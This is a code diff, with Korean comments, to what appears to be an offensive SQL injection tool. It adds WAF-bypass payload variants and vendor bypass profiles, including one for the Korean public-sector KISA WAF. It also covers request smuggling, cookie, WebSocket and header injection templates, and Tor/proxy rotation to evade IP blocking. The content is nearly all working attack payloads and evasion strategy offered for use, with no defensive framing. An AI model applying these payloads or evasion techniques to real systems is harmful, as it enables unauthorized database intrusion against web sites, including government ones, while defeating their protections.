@@ -127,10 +127,20 @@ FUNCTION_ALTERNATIVES: dict[str, list[str]] = {
 
     # ── SLEEP/시간 기반 ─────────────────────────────────────────
     "SLEEP": [
-        "SLEEP/***/({n})",
-        "BENCHMARK(5000000,MD5(1))",
-        "GET_LOCK('a',{n})",
+        "SLEEP/***/({n})",           # 공백 주석
+        "SLEEP/***/({n},1)",         # MySQL 2-arg
+        "/*!SLEEP*/({n})",           # 버전 인라인 주석
+        "SLEEP%09({n})",             # 탭 공백
+        "BENCHMARK(50000000,MD5(1))",
+        "GET_LOCK(0x61,{n})",        # GET_LOCK('a', n)
         "WAIT_FOR_EXECUTED_GTID_SET('a',{n})",
+        # PostgreSQL 대체
+        "pg_sleep({n})",
+        "(SELECT pg_sleep({n}))",
+        # MSSQL 대체
+        "WAITFOR DELAY '0:0:{n}'",
+        # SQLite 대체
+        "(SELECT count(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3)",
     ],
 
     # ── SELECT 키워드 ───────────────────────────────────────────
@@ -154,15 +164,32 @@ FUNCTION_ALTERNATIVES: dict[str, list[str]] = {
     "AND": [
         "&&",
         "AND/**/",
-        "%26%26",   # URL 인코딩 &&
+        "%26%26",           # URL 인코딩 &&
         "AND%0a",
         "/*!AND*/",
+        # v1.2.0 추가 — 고급 우회
+        "/*!12345AND*/",    # 버전 인라인 주석
+        "AnD",              # 대소문자 혼합
+        "AND%09",           # 탭 공백
+        "%09AND%09",        # 탭 양쪽
+        "%00AND%00",        # NULL 바이트
+        "AND%0d%0a",        # CRLF
+        "XOR/**/0/**/OR",   # MySQL XOR 우회 (1 XOR 0 = 1)
+        "%2526%2526",       # 이중 URL 인코딩 &&
     ],
     "OR": [
         "||",
         "OR/**/",
         "%7c%7c",
         "OR%0a",
+        # v1.2.0 추가
+        "/*!12345OR*/",
+        "Or",
+        "OR%09",
+        "%09OR%09",
+        "%00OR%00",
+        "OR%0d%0a",
+        "%257c%257c",       # 이중 URL 인코딩 ||
     ],
 }
 
@@ -379,7 +406,244 @@ GLOBAL_WAF_PROFILES: dict[str, dict] = {
         "tampers": ["space2comment", "versionedmorekeywords", "randomcase"],
         "notes": "한국 금융/공공기관 多 사용",
     },
+
+    # ── KISA WAF (한국인터넷진흥원 / 공공기관 전용) ──────────────
+    "kisa": {
+        "vendor": "KISA / 공공기관 전용 WAF (Korea Internet & Security Agency)",
+        "detection": ["KISA", "kisa", "비정상적인 접근", "보안 정책", "차단 페이지"],
+        "bypass_strategy": [
+            "/*!12345AND*/ 버전 인라인 주석 — AND/OR 키워드 직접 우회",
+            "%09(탭)을 공백 대신 사용: ?id=1%09AND%091=1",
+            "CASE WHEN 조건문: CASE WHEN 1=1 THEN 1 ELSE 0 END (AND 없음)",
+            "HTTP 헤더 인젝션: X-Forwarded-For, Referer, User-Agent에 페이로드",
+            "파라미터 오염(HPP): ?id=1&id=payload — 일부 파서가 뒤쪽 값 처리",
+            "소문자 혼합: AnD, Or",
+            "NULL 바이트 삽입: %00AND%001=1",
+            "LIKE/REGEXP 조건으로 AND/OR 대체",
+        ],
+        "tampers": ["space2tab", "versionedmorekeywords", "randomcase", "nullbyte"],
+        "notes": "공공기관 표준 WAF — 400 응답으로 SQL 키워드 차단. 헤더 인젝션이 가장 효과적",
+    },
+
+    # ── HTTP Request Smuggling CL.TE ─────────────────────────────
+    "request_smuggling": {
+        "vendor": "HTTP Request Smuggling (CL.TE)",
+        "detection": [],
+        "bypass_strategy": [
+            "CL.TE: Content-Length=0 + Transfer-Encoding: chunked",
+            "WAF는 Content-Length=0 기준으로 빈 바디 허용",
+            "백엔드는 Transfer-Encoding으로 실제 chunked body 처리",
+            "sqli_request_smuggling(url, param, true_payload, false_payload) 호출",
+        ],
+        "tampers": [],
+        "notes": "Boolean/헤더/프로토콜 모두 실패 후 최후 수단. 서버 인프라 구조 파악 필요",
+    },
+
+    # ── gzip 압축 인코딩 ──────────────────────────────────────────
+    "gzip_encoding": {
+        "vendor": "Content-Encoding: gzip Request Body",
+        "detection": [],
+        "bypass_strategy": [
+            "Content-Encoding: gzip + gzip 압축된 요청 바디",
+            "WAF가 압축 해제 없이 통과시키면 백엔드에서 SQL 실행",
+            "_sqli_run_gzip(url, param, payload) 함수 사용",
+        ],
+        "tampers": [],
+        "notes": "Python requests 라이브러리 필요. curl 불가.",
+    },
+
+    # ── Second-order SQLi ─────────────────────────────────────────
+    "second_order": {
+        "vendor": "Second-order (Stored) SQL Injection",
+        "detection": [],
+        "bypass_strategy": [
+            "저장 폼: username=admin'-- (WAF 통과, DB에 그대로 저장)",
+            "조회 시: SELECT * FROM users WHERE name='admin'-- 실행",
+            "이중 인코딩 저장: admin%2527-- → URL디코딩 → admin'-- → 저장",
+            "_inject_second_order_notice 자동 교정기가 저장 패턴 감지 시 안내",
+        ],
+        "tampers": [],
+        "notes": "WAF는 입력 시점만 검사 → DB에 저장된 값이 실행될 때 WAF 우회 완성",
+    },
+
+    # ── 유니코드 정규화 ───────────────────────────────────────────
+    "unicode_normalization": {
+        "vendor": "Unicode Normalization Bypass",
+        "detection": [],
+        "bypass_strategy": [
+            "전각문자: ＡＮＤ, ＯＲ, ＳＥＬＥＣＴ → 일부 DBMS가 정규화",
+            "키릴 문자: Ѕ (U+0405) → S로 정규화되는 시스템",
+            "MySQL 과학적 표기법: 1e0=1e0 → TRUE",
+            "HEX 값: AND 0x31=0x31 → AND 1=1",
+            "_waf_bypass_variants variant 13-16번으로 자동 시도",
+        ],
+        "tampers": [],
+        "notes": "DBMS와 앱의 문자 정규화 레벨에 의존. MySQL 5.7+에서 효과적",
+    },
+
+    # ── WebSocket 인젝션 ──────────────────────────────────────────
+    "websocket_sqli": {
+        "vendor": "WebSocket SQL/Command Injection",
+        "detection": ["upgrade: websocket", "101 switching protocols", "ws://", "wss://"],
+        "bypass_strategy": [
+            "WebSocket 메시지에 SQLi 페이로드 삽입",
+            "WAF가 WebSocket 트래픽 미검사 → HTTP 차단 우회",
+            "JSON 메시지: {\"query\": \"1' AND SLEEP(5)-- -\"}",
+            "_inject_websocket_hint 자동 교정기가 WS 감지 시 안내",
+        ],
+        "tampers": [],
+        "notes": "websocket-client Python 라이브러리 필요",
+    },
+
+    # ── 쿠키 인젝션 ───────────────────────────────────────────────
+    "cookie_injection": {
+        "vendor": "Cookie-based SQL Injection",
+        "detection": [],
+        "bypass_strategy": [
+            "쿠키 값에 페이로드: Cookie: session=1' AND 1=1-- -",
+            "URL 파라미터 WAF 차단돼도 쿠키는 통과하는 경우",
+            "_sqli_make_cookie_cmd(url, param, payload) 함수 사용",
+            "sqli_boolean STAGE 5a에서 자동 시도",
+        ],
+        "tampers": [],
+        "notes": "세션/추적 쿠키를 DB 조회에 사용하는 앱에서 효과적",
+    },
+
+    # ── IP 로테이션 / Tor ─────────────────────────────────────────
+    "ip_rotation": {
+        "vendor": "IP Rotation / Tor / Proxy",
+        "detection": ["429 Too Many Requests", "Rate Limit", "IP blocked"],
+        "bypass_strategy": [
+            "Tor: brew install tor && tor (포트 9050) — _detect_tor() 자동 감지",
+            "sqli_with_ip_rotation(url, param, ...) — Tor/프록시 자동 로테이션",
+            "_inject_ip_blocked_notice — 429/403 반복 감지 시 자동 안내",
+            "프록시 풀: proxy_list=['socks5://...', 'http://...'] 지정",
+        ],
+        "tampers": [],
+        "notes": "모든 기술적 우회 성공해도 IP 차단되면 무용지물 — 가장 중요한 방어선",
+    },
+
+    # ── 파라미터 폭탄 ─────────────────────────────────────────────
+    "param_flood": {
+        "vendor": "Parameter Flooding (WAF Parser Overload)",
+        "detection": [],
+        "bypass_strategy": [
+            "500개 더미 파라미터 + 실제 페이로드 동시 전송",
+            "WAF가 파라미터 수 제한 초과 시 분석 포기하고 통과",
+            "_sqli_make_param_flood_cmd(url, param, payload) 함수 사용",
+            "sqli_boolean STAGE 6a에서 자동 시도",
+        ],
+        "tampers": [],
+        "notes": "일부 WAF(Imperva, ModSecurity)에서 효과적. 서버 부하 증가 주의",
+    },
+
+    # ── 경로 정규화 우회 ──────────────────────────────────────────
+    "path_normalization": {
+        "vendor": "URL Path Normalization Bypass",
+        "detection": [],
+        "bypass_strategy": [
+            "이중 슬래시: //page.php → WAF 룰셋 미매칭",
+            "도트 삽입: /./page.php",
+            "인코딩: /%2e/page.php",
+            "_sqli_make_path_normalize_cmd 함수 사용",
+        ],
+        "tampers": [],
+        "notes": "Nginx/Apache 설정에 따라 효과 다름",
+    },
+
+    # ── HPP / JSON / Multipart / HTTP2 / Chunked 프로토콜 우회 ──
+    "protocol_bypass": {
+        "vendor": "Protocol-Level WAF Bypass (범용)",
+        "detection": [],  # 명시적 감지 없음 — Boolean/헤더 모두 실패 시 자동 시도
+        "bypass_strategy": [
+            "HPP (HTTP Parameter Pollution): ?id=1&id=payload — 일부 WAF는 첫 번째 값만 검사",
+            "JSON body POST: Content-Type: application/json + {\"id\":\"payload\"} — WAF JSON 파서 미구현 시",
+            "Multipart/form-data: -F 'id=payload' — form boundary로 시그니처 분산",
+            "HTTP/2: --http2 — WAF가 HTTP/1.1만 분석하는 경우",
+            "Chunked Transfer-Encoding: Transfer-Encoding: chunked — 페이로드 분할로 시그니처 분산",
+        ],
+        "tampers": [],
+        "notes": "Boolean 우회 12종 + 헤더 인젝션 5종 모두 실패 후 자동 시도 (sqli_boolean STAGE 4)",
+    },
+
+    # ── Generic 400-block WAF (AND/OR→400 패턴) ──────────────────
+    "generic_400": {
+        "vendor": "Unknown WAF (AND/OR → 400 Block Pattern)",
+        "detection": ["400 bad request", "blocked", "웹 방화벽", "접근이 차단"],
+        "bypass_strategy": [
+            "STEP 1: /*!12345AND*/ 버전 인라인 주석 시도",
+            "STEP 2: %09(탭) 공백 치환: %09AND%09",
+            "STEP 3: CASE WHEN 1=1 THEN 1 ELSE 0 END",
+            "STEP 4: HTTP 헤더 인젝션 — User-Agent/Referer에 페이로드",
+            "STEP 5: X-Forwarded-For: 127.0.0.1 추가 + 페이로드",
+            "STEP 6: POST 바디로 전환 (GET 파라미터 대신)",
+            "STEP 7: 청크 분할 전송 (Transfer-Encoding: chunked)",
+        ],
+        "tampers": ["versionedmorekeywords", "space2tab", "nullbyte", "randomcase"],
+        "notes": "단따옴표로 크기 변화 있으면 injection point는 존재 — WAF만 돌파하면 됨",
+    },
 }
+
+
+# ════════════════════════════════════════════════════════════════
+# HTTP 헤더 인젝션 — URL 파라미터 WAF 우회 완전 실패 시 최후 수단
+# ════════════════════════════════════════════════════════════════
+HTTP_HEADER_INJECTION_TEMPLATES: list[dict] = [
+    {
+        "header": "X-Forwarded-For",
+        "template": "127.0.0.1' {condition} --",
+        "desc": "X-Forwarded-For IP 필드에 페이로드 삽입",
+        "notes": "일부 백엔드가 이 헤더를 WHERE 조건에 포함 (IP 로깅 기능)",
+    },
+    {
+        "header": "User-Agent",
+        "template": "Mozilla/5.0' {condition} -- -",
+        "desc": "User-Agent에 페이로드 삽입",
+        "notes": "방문자 로그/통계 테이블에 User-Agent 저장하는 경우",
+    },
+    {
+        "header": "Referer",
+        "template": "https://www.google.com/search?q=1' {condition} -- -",
+        "desc": "Referer 헤더에 페이로드 삽입",
+        "notes": "유입 경로 추적 기능 있는 사이트에서 효과적",
+    },
+    {
+        "header": "X-Real-IP",
+        "template": "192.168.1.1' {condition} --",
+        "desc": "X-Real-IP 헤더 인젝션",
+        "notes": "X-Forwarded-For 보완 헤더",
+    },
+    {
+        "header": "Accept-Language",
+        "template": "ko-KR,ko' {condition} --",
+        "desc": "Accept-Language 헤더 인젝션",
+        "notes": "다국어 처리 로직에서 헤더값을 쿼리에 포함하는 경우",
+    },
+]
+
+
+def get_header_injection_payloads(condition_true: str, condition_false: str) -> list[dict]:
+    """HTTP 헤더 인젝션 페이로드 쌍 생성.
+
+    Parameters
+    ----------
+    condition_true  : TRUE 조건 (예: "AND 1=1")
+    condition_false : FALSE 조건 (예: "AND 1=2")
+
+    Returns
+    -------
+    list of dict: [{"header": ..., "true_payload": ..., "false_payload": ...}, ...]
+    """
+    result = []
+    for tmpl in HTTP_HEADER_INJECTION_TEMPLATES:
+        result.append({
+            "header": tmpl["header"],
+            "true_payload":  tmpl["template"].replace("{condition}", condition_true),
+            "false_payload": tmpl["template"].replace("{condition}", condition_false),
+            "desc": tmpl["desc"],
+            "notes": tmpl["notes"],
+        })
+    return result
 
 # ════════════════════════════════════════════════════════════════
 # 다국어 에러 메시지 — SQL 에러 감지용 (v1.1.0)
